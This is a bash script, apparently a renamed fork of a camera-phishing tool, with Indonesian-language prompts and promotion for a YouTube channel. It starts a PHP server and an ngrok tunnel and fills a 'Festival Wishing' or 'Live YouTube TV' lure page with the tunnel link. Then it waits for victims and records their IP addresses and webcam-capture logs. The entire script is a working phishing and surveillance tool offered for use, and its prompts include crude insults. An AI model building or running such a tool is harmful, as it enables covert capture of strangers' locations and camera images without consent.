#!/bin/bash
# CumFunk by Mc'Sl0vv

command -v figlet > /dev/null 2>&1 || { echo >&2 | apt-get install figlet -y;}
command -v php > /dev/null 2>&1 || { echo >&2 | apt-get install php -y;}
command -v lolcat > /dev/null 2>&1 || { echo >&2 | apt-get install lolcat -y;}
command -v unzip > /dev/null 2>&1 || { echo >&2 | apt-get install unzip -y;}
command -v wget > /dev/null 2>&1 || { echo >&2 | apt-get install wget -y;}

trap 'printf "\n";stop' 2

banner() {
clear
figlet "CumFunk" -f slant | lolcat

printf " CumFunk Tool by Mc'Sl0vv | www.youtube.com/SILUMANWIBU \n" | lolcat

printf "\n"

}

dependencies() {
echo""
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Nunggu target, Santuy~,\e[0m\e[1;77m Exit? Ctrl + C\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Nah, dapet!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Yuhhuu~ Dapet akses kamera\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}



payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html

}

select_template() {
if [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
camphish
else
printf "\n----- Pilih Template----\n"    | lolcat
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Pilih Template [Saran Gw No 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Festival name [SERAH LO]: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ID Video YouTubenya: \e[0m' yt_video_ID
else
printf "\e[91m LO MAU NGAPAIN KONTOL?\e[0m\n"
sleep 1
select_template
fi
fi
}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok... Sabar...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm64.zip ]]; then
unzip ngrok-stable-linux-arm64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm64.zip
else
echo ""
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Memulai php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Memulai ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Nih linknya, copy aja:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n--- CumFunk by Mc'Sl0vv ---\n"    | lolcat
default_option_server="1"
printf "\n\e[91mSUBSCRIBE DULU DONG\e[0m\n"
printf "\n\e[96mYouTube: SILUMAN WIBU\e[0m\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m GAS KAN!\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template

if [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m LO MAU NGAPAIN?\e[0m\n"
sleep 1
clear
camphish
fi

}

banner
dependencies
camphish

